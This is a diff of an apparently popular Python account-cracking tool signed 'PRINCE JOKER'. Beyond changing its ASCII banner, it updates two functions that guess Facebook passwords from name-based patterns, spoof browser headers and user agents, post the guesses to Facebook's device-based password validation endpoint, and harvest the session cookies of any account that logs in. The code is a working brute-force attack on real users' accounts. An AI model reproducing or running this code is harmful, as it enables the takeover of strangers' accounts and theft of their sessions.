@@ -115,22 +115,17 @@ def FOFALWAYSONFIRE():
  
   os.system(f" clear")                          
   print(f"""\x1b[1;97m
-\033[1;31m    ____   ____   ___    __ __________ ________    
-\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
-\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
-\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
-\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
-\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
-\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
-\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
-\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
-\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
-\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_ 
+
+ ▐▄▄▄      ▄ •▄ ▄▄▄ .▄▄▄  
+  ·██▪     █▌▄▌▪▀▄.▀·▀▄ █·
+▪▄ ██ ▄█▀▄ ▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
+▐▌▐█▌▐█▌.▐▌▐█.█▌▐█▄▄▌▐█•█▌
+ ▀▀▀• ▀█▄▀▪·▀  ▀ ▀▀▀ .▀  ▀
+
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
  Author    : PRINCE JOKER
  Github    : JOKER KHANOO 
  Facebook  : SHAHI JOKER 
- Tool Name : J O K E R
  Tool Type : \033[1;31mFREE\033[1;37m
  Version   : \033[1;32m1.4\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
@@ -162,22 +157,17 @@ def FOFALWAYSONFIRE():
 #FOFALWAYSONFIRE()
  
 logo=(f"""\x1b[1;97m
-\033[1;31m    ____   ____   ___    __ __________ ________    
-\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
-\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
-\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
-\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
-\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
-\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
-\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
-\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
-\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
-\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_ 
+
+ ▐▄▄▄      ▄ •▄ ▄▄▄ .▄▄▄  
+  ·██▪     █▌▄▌▪▀▄.▀·▀▄ █·
+▪▄ ██ ▄█▀▄ ▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
+▐▌▐█▌▐█▌.▐▌▐█.█▌▐█▄▄▌▐█•█▌
+ ▀▀▀• ▀█▄▀▪·▀  ▀ ▀▀▀ .▀  ▀
+
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
  Author    : PRINCE JOKER
  Github    : JOKER KHANOO
  Facebook  : SHAHI JOKER 
- Tool Name : \033[1;36J O K E R\033[1;37m
  Tool Type : \033[1;31mFREE\033[1;37m
  Version   : \033[1;36m0.5\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
@@ -276,10 +266,10 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        head = {'Host': 'www.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"www.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Fof=session.cookies.get_dict().keys()
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
@@ -321,10 +311,10 @@ def m2(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        head = {'Host': 'www.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"www.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Fof=session.cookies.get_dict().keys()
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
